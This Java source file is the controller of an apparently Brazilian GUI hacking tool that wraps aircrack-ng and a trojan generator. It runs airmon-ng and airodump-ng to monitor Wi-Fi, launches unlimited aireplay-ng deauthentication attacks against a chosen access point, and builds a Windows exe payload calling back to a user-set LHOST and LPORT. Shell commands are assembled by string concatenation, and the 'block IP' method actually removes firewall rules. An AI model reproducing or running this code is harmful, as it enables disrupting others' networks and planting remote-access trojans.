/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.javanunes.Ferra;

/**
 *
 * @author ricardo
 */
public class Controller {

     public static void executa(String comando, boolean terminal, boolean fazLogs){
        if(comando.equals("")){
            View.alert("Nao foi passado nenhum comando amor!");
        }
        String comandoCompleto = Model.executor + comando;
        try{
           if(terminal){
              if(fazLogs){   
                View.status(comando);
              }
              Runtime.getRuntime().exec(comandoCompleto); 
              View.print("Executando apenas no TERMINAL::: "+comandoCompleto+"\n");
           }
           else{
            if(fazLogs){   
              View.status(comando);
            }
            Runtime.getRuntime().exec(comando);
            View.print("Executando apenas no console interno::: "+comando+"\n");
           } 
        }
        catch(Exception e){
          View.alert("Deu um erro nesse comando ai "+ e);
        }
    }
    
    public static void bloqueiaIP(String ip){
        if(!ip.isEmpty()){
            String comando1 = Model.firewall + "--zone=home --permanent --remove-rich-rule=\"rule family='ipv4' source address='"+ip+"' reject\"";
            String comando2 = Model.firewall + "--zone=home --permanent --remove-rich-rule=\"rule family='ipv4' destination address='"+ip+"' reject\"";
            String comando3 = Model.firewall + "--reload";
            executa(comando1, true, true);
            executa(comando2, true, false);
            executa(comando3, true,false);
        }
    } 
     
    public static void desbloqueiaIP(String ip){
         if(!ip.isEmpty()){
            String comando1 = Model.firewall + "--zone=home --permanent --remove-rich-rule=\"rule family='ipv4' destination address='"+ip+"' reject\"";
            String comando2 = Model.firewall + "--zone=home --permanent --remove-rich-rule=\"rule family='ipv4' source address='"+ip+"' reject\"";
            String comando3 = Model.firewall + "--reload";
            executa(comando1, true, true);
            executa(comando2, false, false);
            executa(comando3, false, false);
         }
    } 
     
    public static void prepararPlacasParaAtaqueMonitoramento(){
        String comando1 = "airmon-ng check kill " + View.getPlacaRede();
        View.alert("A rede WiFi irá cair para virar monitoradora!");
        executa(comando1, false, true);
        executa(comando1, false, true);
        executa(comando1, false, true);
        executa(comando1, true, true);
        executa(comando1, true, true);
    }
    
    public static void restaurarConexoesWifi(){
        String comando1 = "systemctl restart NetworkManager";
        String comando2 = "systemctl restart avahi-daemon";
        String comando3 = "systemctl restart wpa_supplicant";
        String comando4 = "iw phy phy0 interface add "+View.getInterface()+" type station";
        executa(comando1, false, false);
        executa(comando2, false, false);
        executa(comando3, false, false);
        executa(comando4, true, true);
    }
    
    public static void monitorWifiAirodump(){
        String comando1 = "airodump-ng --channel " + View.getCanal() + " " + View.getInterface();
        executa(comando1, true, true);
    }
    
    public static void gerarArtefatoExe(){
        String comando1 =  Model.criadorTrojan +" -p "+View.getCategoriaArtefato()+ " LHOST="+View.getIp()+" LPORT="+View.getPorta()+" -f exe -o "+Model.virusExe;
        executa(comando1, true, true);
    } 
    
    public static void atacar(){
        String comando = "aireplay-ng --deauth 0 -a " +View.getMac()+ " " + View.getInterface();
        executa(comando, true, true);
    }
    
    public static boolean isRoot(){
        if(System.getenv("USER").equals("root")){
            return true;
        }
        return false;
    }
    
    public static void main(String[] args) {
        // TODO code application logic here
        View.abreForm();
    }
    
}
